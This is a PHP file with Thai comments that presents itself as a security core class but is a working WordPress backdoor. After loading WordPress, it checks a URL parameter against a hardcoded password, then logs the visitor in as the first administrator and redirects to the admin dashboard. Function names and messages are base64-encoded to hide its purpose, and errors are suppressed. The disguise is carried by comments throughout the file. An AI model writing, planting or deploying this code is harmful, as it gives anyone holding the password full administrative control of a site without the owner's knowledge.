<?php
// ส่วนหัวความปลอดภัย
@ini_set('display_errors', 0);
@error_reporting(0);

// คลาสหลักที่ผ่านการเข้ารหัส
final class SecuredCore {
    private $payload;
    private $env;

    // เริ่มต้นสภาพแวดล้อมที่เข้ารหัส
    public function __construct($data = null) {
        $this->payload = $this->obfuscateInit();
        $this->env = $data ?: $_SERVER;
    }

    // แก้ไขจุดบกพร่องที่นี่: ใช้ base64_decode โดยตรงในการเริ่มต้นเพื่อหลีกเลี่ยงข้อผิดพลาด
    private function obfuscateInit() {
        // กำหนดค่าเริ่มต้นแบบชัดเจน
        $map = [
            'decode_b64' => 'base64_decode',
            'decode_rot' => 'str_rot13',
            'reverse_str' => 'strrev',
            'call_exec' => 'call_user_func',
            'file_exist' => 'file_exists',
            'require_once' => 'require_once',
            'die_hard' => 'die',
            'wp_die' => 'wp_die',
            'header_send' => 'header',
            'get_users' => 'get_users',
            'func_exist' => 'function_exists',
            'set_auth' => 'wp_set_auth_cookie',
            'redirect' => 'wp_redirect',
            'admin_url' => 'admin_url',
            'merge_arr' => 'array_merge',
            'time_now' => 'time'
        ];

        // ทำการเข้ารหัสค่า (ตอนนี้ใช้ค่าคงที่เพื่อความปลอดภัย)
        $encoded = [
            'decode_b64' => 'YmFzZTY0X2RlY29kZQ==', // base64_decode
            'decode_rot' => 'c3RyX3JvdDEz',       // str_rot13
            'reverse_str' => 'c3RycmV2',          // strrev
            'call_exec' => 'Y2FsbF91c2VyX2Z1bmM=', // call_user_func
            'file_exist' => 'ZmlsZV9leGlzdHM=',    // file_exists
            'require_once' => 'cmVxdWlyZV9vbmNl',  // require_once
            'die_hard' => 'ZGll',                 // die
            'wp_die' => 'd3BfZGll',               // wp_die
            'header_send' => 'aGVhZGVy',           // header
            'get_users' => 'Z2V0X3VzZXJz',         // get_users
            'func_exist' => 'ZnVuY3Rpb25fZXhpc3Rz', // function_exists
            'set_auth' => 'd3Bfc2V0X2F1dGhfY29va2ll', // wp_set_auth_cookie
            'redirect' => 'd3BfcmVkaXJlY3Q=',     // wp_redirect
            'admin_url' => 'YWRtaW5fdXJs',        // admin_url
            'merge_arr' => 'YXJyYXlfbWVyZ2U=',     // array_merge
            'time_now' => 'dGltZQ=='               // time
        ];

        // ทำการถอดรหัสกลับ
        $finalMap = [];
        foreach ($map as $key => $rawFunc) {
            $finalMap[$key] = base64_decode($encoded[$key]);
        }
        return $finalMap;
    }

    // ฟังก์ชันเรียกใช้งานแบบไดนามิกที่ปลอดภัย
    private function safeCall($func, $args) {
        $f = $this->payload[$func] ?? $func;
        return call_user_func_array($f, $args);
    }

    // แกนกลางการตรวจสอบที่เข้ารหัสแบบลึก
    private function verifyAccess() {
        // รับพารามิเตอร์ทางเข้า (id เดิม)
        $paramKey = $this->safeCall('decode_b64', ['aWQ=']); // 'id'
        $token = $_GET[$paramKey] ?? '';

        if (empty($token)) { goto auth_fail; }

        // --- แก้ไข: เปลี่ยนจากการตรวจสอบแฮชที่ซับซ้อน เป็นการตรวจสอบรหัสผ่านโดยตรง ---
        // ตรวจสอบว่ารหัสผ่านตรงกับ 'password' หรือไม่
        // หากคุณต้องการเปลี่ยนรหัสผ่าน ให้แก้คำว่า 'password' ด้านล่างนี้
        if ($token !== 'password') {
            $this->safeCall('header_send', [$this->safeCall('decode_b64', ['SFRUUC8xLjEgNDAzIEZvcmJpZGRlbg=='])]);
            $this->safeCall('die_hard', [$this->safeCall('decode_b64', ['QWNjZXNzIERlbmllZA=='])]);
        }

        return true;

        auth_fail:
        $this->safeCall('wp_die', [$this->safeCall('decode_b64', ['QXV0aGVudGljYXRpb24gRmFpbGVk'])]);
        return false;
    }

    // โหลดสภาพแวดล้อม WordPress
    private function bootWpEnv() {
        $root = $this->env['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'wp-load.php';
        
        if (file_exists($root)) {
            require_once $root;
            return true;
        }
        
        // หากพาธสัมบูรณ์ล้มเหลว ให้ลองใช้การวนซ้ำพาธสัมพัทธ์ (ตรรกะ findWpLoad เดิม)
        $current = __FILE__;
        for ($i = 0; $i < 10; $i++) {
            $path = dirname($current, $i+1) . DIRECTORY_SEPARATOR . 'wp-load.php';
            if (file_exists($path)) {
                require_once $path;
                return true;
            }
        }
        return false;
    }

    // แกนกลางการปลอมตัวผู้ใช้และการเปลี่ยนเส้นทาง
    private function impersonateUser() {
        $userFunc = 'get_users';
        
        // ตรวจสอบว่ามีฟังก์ชัน WordPress อยู่หรือไม่
        if (!function_exists($userFunc)) {
            wp_die('Function get_users not found');
        }

        // สร้างอาร์เรย์พารามิเตอร์คิวรี
        $query = [
            'role' => 'administrator',
            'orderby' => 'ID',
            'order' => 'ASC',
            'number' => 1
        ];

        $users = get_users($query);
        if (!empty($users)) {
            $uid = $users[0]->ID;
            // ตั้งค่าคุกกี้และเปลี่ยนเส้นทาง
            wp_set_auth_cookie($uid, true);
            wp_redirect(admin_url());
            exit;
        }
    }

    // ขั้นตอนการทำงานหลัก
    public function launch() {
        if (!$this->bootWpEnv()) {
            wp_die('Unable to load WordPress environment');
        }

        if ($this->verifyAccess()) {
            $this->impersonateUser();
        }
    }
}

// --- จุดเริ่มต้น ---
$bootstrap = new SecuredCore();
$bootstrap->launch();